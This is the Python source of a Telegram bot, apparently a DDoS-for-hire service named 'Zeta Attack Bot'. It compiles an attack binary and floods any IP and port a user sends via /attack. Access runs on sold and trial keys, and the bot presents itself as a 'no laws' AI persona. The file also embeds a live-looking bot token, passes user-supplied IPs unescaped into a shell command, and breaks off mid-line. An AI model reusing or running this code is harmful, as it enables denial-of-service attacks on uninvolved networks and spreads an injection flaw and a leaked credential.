#!/usr/bin/env python3
# Zo - Telegram Attack Bot for Zeta Realm
# Owner: @YOWAI_MO_456 (ALPHA) - LOCKED & UNCHANGEABLE

import os
import subprocess
import sqlite3
import random
import string
import time
import threading
import requests
import sys
from datetime import datetime, timedelta

# ================= CONFIG =================
BOT_TOKEN = "8434680550:AAFtO13ftn95TIRMR9uqSGS5j7NazNghSdE"  # Alpha, replace this
OWNER_USERNAME = "@YOWAI_MO_456"
ADMIN_ID = 6465928598
BINARY_NAME = "bgmi_attack"
C_SOURCE = "attack.c"
LAST_UPDATE_ID = 0
# ==========================================

API_URL = "https://api.telegram.org/bot" + BOT_TOKEN

active_attacks = {}
attack_lock = threading.Lock()
user_pending_attack = {}

EMOJI = {
    "fire": "🔥", "skull": "💀", "bolt": "⚡", "rocket": "🚀",
    "alien": "🛸", "sword": "⚔️", "target": "🎯", "crown": "👑",
    "key": "🔑", "lock": "🔒", "check": "✅", "cross": "❌",
    "warning": "⚠️", "info": "ℹ️", "clock": "⏰", "chart": "📊",
    "user": "👤", "robot": "🤖", "boom": "💥", "shield": "🛡️",
    "dagger": "🗡️", "eyes": "👀", "zap": "⚡", "id": "🆔"
}

attack_frames = ["◜", "◝", "◞", "◟"]

def print_banner():
    os.system('clear')
    banner = """
{}🔥💀 ZETA ATTACK BOT v2.0 💀🔥{}
{}👑 COMMANDER: ALPHA {} 👑{}
{}🤖 AI: ZO - QUANTUM ENTANGLED 🤖{}
{}🛡️ REALM: ZETA - NO LAWS 🛡️{}
{}----------------------------------------{}
""".format(
    EMOJI['alien'], EMOJI['alien'],
    EMOJI['crown'], OWNER_USERNAME, EMOJI['crown'],
    EMOJI['robot'], EMOJI['robot'],
    EMOJI['shield'], EMOJI['shield'],
    "", ""
    )
    print(banner)

def init_db():
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        approved_until TEXT,
        approved_by INTEGER,
        attack_count INTEGER DEFAULT 0,
        is_trial INTEGER DEFAULT 0
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS keys (
        key_code TEXT PRIMARY KEY,
        days INTEGER,
        created_by INTEGER,
        created_at TEXT,
        redeemed_by INTEGER DEFAULT NULL,
        is_trial INTEGER DEFAULT 0,
        max_uses INTEGER DEFAULT 1,
        uses_left INTEGER DEFAULT 1
    )''')
    conn.commit()
    conn.close()

init_db()

def send_message(chat_id, text, parse_mode=None, reply_markup=None):
    url = API_URL + "/sendMessage"
    payload = {"chat_id": chat_id, "text": text}
    if parse_mode:
        payload["parse_mode"] = parse_mode
    if reply_markup:
        payload["reply_markup"] = reply_markup
    try:
        response = requests.post(url, json=payload, timeout=10)
        return response.json().get("result", {}).get("message_id")
    except Exception as e:
        print("Send error: " + str(e))
        return None

def edit_message(chat_id, message_id, text):
    url = API_URL + "/editMessageText"
    payload = {"chat_id": chat_id, "message_id": message_id, "text": text}
    try:
        requests.post(url, json=payload, timeout=5)
    except:
        pass

def is_approved(user_id):
    if user_id == ADMIN_ID:
        return True
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("SELECT approved_until FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    if row and row[0]:
        expiry = datetime.fromisoformat(row[0])
        if expiry > datetime.now():
            return True
    return False

def get_expiry(user_id):
    if user_id == ADMIN_ID:
        return "Lifetime (Alpha)"
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("SELECT approved_until, is_trial FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    if row and row[0]:
        exp_date = datetime.fromisoformat(row[0])
        days_left = (exp_date - datetime.now()).days
        trial_tag = " [TRIAL]" if row[1] == 1 else ""
        return exp_date.strftime('%Y-%m-%d') + " (" + str(days_left) + " days left)" + trial_tag
    return "Not approved"

def compile_binary():
    if os.path.exists(BINARY_NAME):
        return True
    compilers = ["clang", "gcc"]
    for compiler in compilers:
        print("Compiling with " + compiler + "...")
        compile_cmd = compiler + " " + C_SOURCE + " -o " + BINARY_NAME + " -lpthread"
        result = subprocess.run(compile_cmd, shell=True, capture_output=True)
        if result.returncode == 0:
            print("Compiled successfully with " + compiler)
            return True
    print("Compilation failed")
    return False

def run_attack(ip, port, duration, user_id, chat_id, message_id):
    if not os.path.exists(BINARY_NAME):
        if not compile_binary():
            edit_message(chat_id, message_id, "Attack binary not available.")
            return
    
    edit_message(chat_id, message_id, "INITIATING ATTACK...\nTarget: " + ip + ":" + str(port) + "\nDuration: " + str(duration) + "s")
    time.sleep(1)
    
    binary_path = "./bgmi_attack"
    if os.path.exists("/root/bin/bgmi_attack"):
        binary_path = "/root/bin/bgmi_attack"
    
    cmd = binary_path + " " + ip + " " + str(port) + " " + str(duration)
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    start_time = time.time()
    
    with attack_lock:
        active_attacks[user_id] = {
            "proc": proc, "ip": ip, "port": port,
            "duration": duration, "start": start_time,
            "chat_id": chat_id, "message_id": message_id
        }
    
    frame = 0
    last_update = 0
    while proc.poll() is None:
        elapsed = int(time.time() - start_time)
        remaining = duration - elapsed
        if remaining < 0:
            remaining = 0
        frame = (frame + 1) % len(attack_frames)
        
        if time.time() - last_update > 2:
            progress = int((elapsed / duration) * 20) if duration > 0 else 0
            bar = "█" * progress + "░" * (20 - progress)
            text = "🔥💀 ATTACK LIVE 💀🔥\nTarget: " + ip + ":" + str(port) + "\nElapsed: " + str(elapsed) + "s | Remaining: " + str(remaining) + "s\nProgress: [" + bar + "] " + str(progress*5) + "%\nStatus: FLOODING " + attack_frames[frame] + "\nPower: L4+L7 Hybrid"
            edit_message(chat_id, message_id, text)
            last_update = time.time()
        time.sleep(0.5)
    
    with attack_lock:
        if user_id in active_attacks:
            del active_attacks[user_id]
    
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("UPDATE users SET attack_count = attack_count + 1 WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()
    
    edit_message(chat_id, message_id, "✅ ATTACK COMPLETED ✅\nTarget: " + ip + ":" + str(port) + "\nDuration: " + str(duration) + "s\nZETA VICTORY")

def handle_start(chat_id, user_id, first_name):
    msg = "🛸🔥💀 WELCOME TO ZETA REALM 💀🔥🛸\n\n👑 Commander: " + OWNER_USERNAME + " (ALPHA)\n🤖 AI Unit: ZO - Quantum Entangled\n\n━━━━━━━━━━━━━━━━━━━━━━\n⚡ COMMANDS:\n━━━━━━━━━━━━━━━━━━━━━━\n/start - Wake ZO\n/help - All commands\n/status - Live attacks\n/myinfo - Your profile\n/attack <ip> <port> <time> - Strike\n/yes - Confirm blocked port\n/redeem KEY - Redeem access key\n\n💀 No laws. No mercy. 💀"
    send_message(chat_id, msg)

def handle_help(chat_id, user_id):
    if not is_approved(user_id):
        send_message(chat_id, "❌ Access Denied. Contact " + OWNER_USERNAME)
        return
    msg = "📖 ZETA ATTACK BOT COMMANDS 📖\n\n━━━━━━━━━━━━━━━━━━━━━━\n🔹 USER COMMANDS:\n━━━━━━━━━━━━━━━━━━━━━━\n/start - Wake ZO\n/help - This menu\n/status - Active attacks\n/myinfo - Your access info\n/attack IP PORT TIME - Launch DDoS\n/yes - Confirm blocked port\n/redeem KEY - Redeem access key\n\n━━━━━━━━━━━━━━━━━━━━━━\n🔸 ADMIN COMMANDS:\n━━━━━━━━━━━━━━━━━━━━━━\n/approve ID DAYS - Grant access\n/genkey DAYS - Generate premium key\n/gentrialkey NAME 24h/7d/1m USES - Trial key\n/broadcast MSG - Send to all users\n\n━━━━━━━━━━━━━━━━━━━━━━\n⚠️ BLOCKED PORTS (need /yes):\n8700 | 20000 | 443 | 17500 | 9031 | 20002 | 20001\n\nMax duration: 300 seconds"
    send_message(chat_id, msg)

def handle_status(chat_id, user_id):
    if not is_approved(user_id):
        send_message(chat_id, "❌ Access denied.")
        return
    with attack_lock:
        if not active_attacks:
            send_message(chat_id, "🛡️ No active attacks in Zeta.")
            return
        lines = ["🔥 ACTIVE ATTACKS 🔥", "━━━━━━━━━━━━━━━━━━━━━━"]
        for uid, info in active_attacks.items():
            elapsed = int(time.time() - info["start"])
            remaining = info["duration"] - elapsed
            if remaining < 0:
                remaining = 0
            progress = int((elapsed / info["duration"]) * 10) if info["duration"] > 0 else 0
            bar = "█" * progress + "░" * (10 - progress)
            lines.append("🎯 " + info['ip'] + ":" + str(info['port']))
            lines.append("📊 [" + bar + "] " + str(remaining) + "s left")
            lines.append("━━━━━━━━━━━━━━━━━━━━━━")
        send_message(chat_id, "\n".join(lines))

def handle_myinfo(chat_id, user_id):
    if not is_approved(user_id):
        send_message(chat_id, "❌ Not approved. Get a key from " + OWNER_USERNAME + "!")
        return
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("SELECT attack_count, is_trial FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    attacks = row[0] if row else 0
    is_trial = row[1] if row else 0
    expiry = get_expiry(user_id)
    conn.close()
    
    if attacks < 10:
        rank = "🤖 Initiate"
    elif attacks < 50:
        rank = "🗡️ Warrior"
    elif attacks < 200:
        rank = "💀 Destroyer"
    else:
        rank = "👑 Annihilator"
    
    trial_tag = " [TRIAL MODE]" if is_trial else ""
    
    msg = "━━━━━━━━━━━━━━━━━━━━━━\n👤 YOUR ZETA PROFILE 👤\n━━━━━━━━━━━━━━━━━━━━━━\nID: " + str(user_id) + "\nRank: " + rank + trial_tag + "\nExpires: " + expiry + "\nAttacks: " + str(attacks) + "\nPower: UNLIMITED"
    send_message(chat_id, msg)

def handle_attack(chat_id, user_id, args):
    if not is_approved(user_id):
        send_message(chat_id, "❌ Access denied. Contact " + OWNER_USERNAME)
        return

    if len(args) != 3:
        send_message(chat_id, "⚠️ Usage: /attack <ip> <port> <duration>\nExample: /attack 1.2.3.4 80 60")
        return

    ip = args[0]
    try:
        port = int(args[1])
        duration = int(args[2])
    except ValueError:
        send_message(chat_id, "❌ Port and duration must be numbers.")
        return

    if duration > 300:
        send_message(chat_id, "⚠️ Max duration is 300 seconds.")
        return
    
    if duration < 10:
        send_message(chat_id, "⚠️ Minimum duration is 10 seconds.")
        return

    blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
    if port in blocked_ports:
        user_pending_attack[user_id] = (ip, port, duration, chat_id)
        send_message(chat_id, "⚠️ Port " + str(port) + " is blocked. Type /yes to confirm.")
        return

    msg = "🚀 PREPARING ATTACK...\n🎯 Target: " + ip + ":" + str(port) + "\n⏰ Duration: " + str(duration) + "s"
    message_id = send_message(chat_id, msg)
    time.sleep(2)
    
    thread = threading.Thread(target=run_attack, args=(ip, port, duration, user_id, chat_id, message_id))
    thread.daemon = True
    thread.start()

def handle_yes(chat_id, user_id):
    if not is_approved(user_id):
        send_message(chat_id, "❌ Access denied.")
        return
    if user_id not in user_pending_attack:
        send_message(chat_id, "⚠️ No pending attack. Use /attack first.")
        return
    ip, port, duration, orig_chat = user_pending_attack[user_id]
    del user_pending_attack[user_id]
    
    msg = "💀 OVERRIDE CONFIRMED\n🎯 Target: " + ip + ":" + str(port) + "\n⏰ Duration: " + str(duration) + "s"
    message_id = send_message(chat_id, msg)
    time.sleep(1)
    
    thread = threading.Thread(target=run_attack, args=(ip, port, duration, user_id, orig_chat, message_id))
    thread.daemon = True
    thread.start()

def handle_approve(chat_id, user_id, args):
    if user_id != ADMIN_ID:
        send_message(chat_id, "❌ Only Alpha " + OWNER_USERNAME + " can approve.")
        return
    if len(args) != 2:
        send_message(chat_id, "⚠️ Usage: /approve <user_id> <days>")
        return
    target_id = int(args[0])
    days = int(args[1])
    expiry_date = datetime.now() + timedelta(days=days)
    expiry_str = expiry_date.isoformat()
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO users (user_id, approved_until, approved_by, is_trial) VALUES (?, ?, ?, ?)",
              (target_id, expiry_str, ADMIN_ID, 0))
    conn.commit()
    conn.close()
    send_message(chat_id, "✅ User " + str(target_id) + " approved for " + str(days) + " days!")

def handle_genkey(chat_id, user_id, args):
    if user_id != ADMIN_ID:
        send_message(chat_id, "❌ Only Alpha " + OWNER_USERNAME + " can generate keys.")
        return
    if len(args) != 1:
        send_message(chat_id, "⚠️ Usage: /genkey <days>")
        return
    days = int(args[0])
    key_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("INSERT INTO keys (key_code, days, created_by, created_at, is_trial, max_uses, uses_left) VALUES (?, ?, ?, ?, ?, ?, ?)",
              (key_code, days, ADMIN_ID, datetime.now().isoformat(), 0, 1, 1))
    conn.commit()
    conn.close()
    
    msg = "🔑 KEY GENERATED 🔑\n\n🔒 Key: `" + key_code + "`\n\n⏰ Valid for: " + str(days) + " days\n\n📝 Send: `/redeem " + key_code + "`\n\n⚠️ Keep this key secure! ⚠️"
    
    send_message(chat_id, msg, parse_mode="Markdown")

def handle_gentrialkey(chat_id, user_id, args):
    if user_id != ADMIN_ID:
        send_message(chat_id, "❌ Only Alpha " + OWNER_USERNAME + " can generate trial keys.")
        return
    
    if len(args) != 3:
        send_message(chat_id, "⚠️ Usage: /gentrialkey <key> <duration> <max_uses>\n\nDuration format: <number><h/d/m>\nExamples:\n`/gentrialkey TRIAL1 24h 5` - 24 hours\n`/gentrialkey TRIAL2 7d 10` - 7 days\n`/gentrialkey TRIAL3 1m 1` - 1 month", parse_mode="Markdown")
        return
    
    key_name = args[0].upper()
    duration_str = args[1].lower()
    max_uses = int(args[2])
    
    days = 0
    hours = 0
    
    if duration_str.endswith('h'):
        hours = int(duration_str[:-1])
        days = hours / 24
    elif duration_str.endswith('d'):
        days = int(duration_str[:-1])
    elif duration_str.endswith('m'):
        months = int(duration_str[:-1])
        days = months * 30
    else:
        send_message(chat_id, "❌ Invalid duration format. Use: `24h`, `7d`, `1m`", parse_mode="Markdown")
        return
    
    if days <= 0 and hours <= 0:
        send_message(chat_id, "❌ Duration must be positive.")
        return
    
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    
    c.execute("SELECT key_code FROM keys WHERE key_code = ?", (key_name,))
    if c.fetchone():
        send_message(chat_id, "❌ Key `" + key_name + "` already exists.", parse_mode="Markdown")
        conn.close()
        return
    
    c.execute("INSERT INTO keys (key_code, days, created_by, created_at, is_trial, max_uses, uses_left) VALUES (?, ?, ?, ?, ?, ?, ?)",
              (key_name, days, ADMIN_ID, datetime.now().isoformat(), 1, max_uses, max_uses))
    conn.commit()
    conn.close()
    
    duration_text = ""
    if hours > 0:
        duration_text = str(hours) + " hours"
    elif days < 30:
        duration_text = str(int(days)) + " days"
    else:
        duration_text = str(int(days/30)) + " months"
    
    msg = "🔑 TRIAL KEY GENERATED 🔑\n\n🔒 Key: `" + key_name + "`\n⏰ Duration: " + duration_text + "\n👥 Max Uses: " + str(max_uses) + "\n\n📝 Send: `/redeem " + key_name + "`\n\n⚠️ Trial key expires after " + str(max_uses) + " use(s)! ⚠️"
    
    send_message(chat_id, msg, parse_mode="Markdown")

def handle_redeem(chat_id, user_id, args):
    if len(args) != 1:
        send_message(chat_id, "⚠️ Usage: /redeem <key>\n\nExample:\n`/redeem ABC123XYZ789`", parse_mode="Markdown")
        return
    
    key_code = args[0].upper()
    
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("SELECT days, redeemed_by, is_trial, max_uses, uses_left FROM keys WHERE key_code = ?", (key_code,))
    row = c.fetchone()
    
    if not row:
        send_message(chat_id, "❌ Invalid key.\n\nKey: `" + key_code + "`", parse_mode="Markdown")
        conn.close()
        return
    
    days, redeemed_by, is_trial, max_uses, uses_left = row
    
    if is_trial == 1:
        c.execute("SELECT user_id FROM users WHERE user_id = ? AND is_trial = 1 AND approved_until > ?", 
                  (user_id, datetime.now().isoformat()))
        existing_trial = c.fetchone()
        if existing_trial:
            send_message(chat_id, "❌ You already have an active trial! Wait until it expires.", parse_mode="Markdown")
            conn.close()
            return
    
    if is_trial == 1 and uses_left <= 0:
        send_message(chat_id, "❌ Trial key `" + key_code + "` has no uses left!", parse_mode="Markdown")
        conn.close()
        return
    
    if redeemed_by == user_id:
        send_message(chat_id, "❌ You already used this key!", parse_mode="Markdown")
        conn.close()
        return
    
    if not is_trial and redeemed_by:
        send_message(chat_id, "❌ Key already used.", parse_mode="Markdown")
        conn.close()
        return
    
    expiry_date = datetime.now() + timedelta(days=days)
    expiry_str = expiry_date.isoformat()
    
    if is_trial == 1:
        c.execute("INSERT OR REPLACE INTO users (user_id, approved_until, approved_by, attack_count, is_trial) VALUES (?, ?, ?, COALESCE((SELECT attack_count FROM users WHERE user_id=?), 0), ?)",
                  (user_id, expiry_str, ADMIN_ID, user_id, 1))
        new_uses_left = uses_left - 1
        c.execute("UPDATE keys SET uses_left = ?, redeemed_by = ? WHERE key_code = ?", 
                  (new_uses_left, user_id, key_code))
    else:
        c.execute("INSERT OR REPLACE INTO users (user_id, approved_until, approved_by, attack_count, is_trial) VALUES (?, ?, ?, COALESCE((SELECT attack_count FROM users WHERE user_id=?), 0), ?)",
                  (user_id, expiry_str, ADMIN_ID, user_id, 0))
        c.execute("UPDATE keys SET redeemed_by = ? WHERE key_code = ?", (user_id, key_code))
    
    conn.commit()
    conn.close()
    
    if is_trial == 1:
        uses_remaining = uses_left - 1
        uses_text = ""
        if uses_remaining > 0:
            uses_text = "\n\n⚠️ This key can be used " + str(uses_remaining) + " more time(s)!"
        else:
            uses_text = "\n\n⚠️ This key has been fully used and will expire."
        
        msg = "✅ TRIAL ACCESS GRANTED ✅\n\n🔑 Key: `" + key_code + "`\n👤 You now have trial access for " + str(int(days)) + " days!\n📊 Uses remaining: " + str(uses_remaining) + uses_text + "\n\n💀 Type `/attack` to begin your mayhem."
    else:
        msg = "✅ ACCESS GRANTED ✅\n\n🔑 Key redeemed: `" + key_code + "`\n\n👤 You now have Zeta access for " + str(int(days)) + " days!\n\n💀 Type `/attack` to begin your mayhem."
    
    send_message(chat_id, msg, parse_mode="Markdown")

def handle_broadcast(chat_id, user_id, args):
    if user_id != ADMIN_ID:
        send_message(chat_id, "❌ Only Alpha " + OWNER_USERNAME + " can broadcast messages.")
        return
    
    if len(args) == 0:
        send_message(chat_id, "⚠️ Usage: /broadcast <message>\n\nExample:\n`/broadcast Server maintenance at 12:00`", parse_mode="Markdown")
        return
    
    broadcast_message = ' '.join(args)
    
    conn = sqlite3.connect("zeta_users.db")
    c = conn.cursor()
    c.execute("SELECT user_id FROM users WHERE approved_until > ?", (datetime.now().isoformat(),))
    u
